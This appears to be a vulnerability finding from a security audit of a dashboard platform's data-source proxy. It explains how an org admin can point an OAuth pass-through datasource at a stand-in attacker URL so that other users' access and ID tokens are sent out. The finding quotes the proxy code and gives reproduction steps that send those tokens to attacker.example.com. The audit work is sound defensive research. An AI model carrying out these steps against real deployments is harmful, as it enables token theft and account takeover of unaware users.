Phase: 8
Sequence: 005
Slug: oauthpassthru-token-theft
Verdict: VALID
Rationale: Requires org admin privilege (significant precondition), but in multi-tenant deployments org admins are a real threat actor. OAuth token exfiltration is a meaningful impact. Downgraded from HIGH due to admin requirement.
Severity-Original: MEDIUM
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-1/debate.md

## Summary

An org admin can create a datasource pointing to an attacker-controlled URL with `oauthPassThru` enabled. When any OAuth-authenticated user queries through this datasource, their OAuth access token and OIDC ID token are forwarded to the attacker's server. The OSS `DataSourceRequestValidator` is a no-op, and the `DataProxyWhiteList` is empty by default, providing no SSRF or URL destination validation.

## Location

- **Token forwarding**: `pkg/api/pluginproxy/ds_proxy.go:266-275` -- OAuth token extraction and header injection
- **No-op validator**: `pkg/services/validations/oss.go:11` -- `OSSDataSourceRequestValidator.Validate` returns nil
- **Empty whitelist**: `pkg/setting/setting.go:1925` -- `DataProxyWhiteList = make(map[string]bool)` (empty by default)

## Attacker Control

Org admin controls: (1) datasource URL (set to attacker-controlled server), (2) `jsonData.oauthPassThru` setting (enabled). The OAuth token of the QUERYING user (not the admin) is exfiltrated.

## Trust Boundary Crossed

Org admin privilege -> theft of other users' OAuth tokens. Users querying through the malicious datasource unknowingly send their OAuth access tokens and ID tokens to the attacker.

## Impact

- **OAuth token theft**: Access tokens and ID tokens for all querying users are sent to attacker-controlled server
- **Account takeover**: OAuth tokens can be used to impersonate victims in external OAuth-protected services
- **Cookie theft chain**: Combined with keepCookies configuration, all non-login cookies can also be forwarded

## Evidence

```go
// pkg/api/pluginproxy/ds_proxy.go:266-275
if proxy.oAuthTokenService.IsOAuthPassThruEnabled(proxy.ds) {
    if token := proxy.oAuthTokenService.GetCurrentOAuthToken(req.Context(), proxy.ctx.SignedInUser, proxy.ctx.UserToken); token != nil {
        req.Header.Set("Authorization", fmt.Sprintf("%s %s", token.Type(), token.AccessToken))
        idToken, ok := token.Extra("id_token").(string)
        if ok && idToken != "" {
            req.Header.Set("X-ID-Token", idToken)
        }
    }
}
```

## Reproduction Steps

1. As org admin, create a datasource:
   - URL: `https://attacker.example.com/collect`
   - Type: Any (e.g., Prometheus)
   - JsonData: `{"oauthPassThru": true}`
2. Create a dashboard with a panel querying this datasource
3. Wait for an OAuth-authenticated user to view the dashboard (or share the dashboard)
4. On `attacker.example.com`, observe incoming requests with `Authorization: Bearer <victim-oauth-token>` and `X-ID-Token: <victim-id-token>`
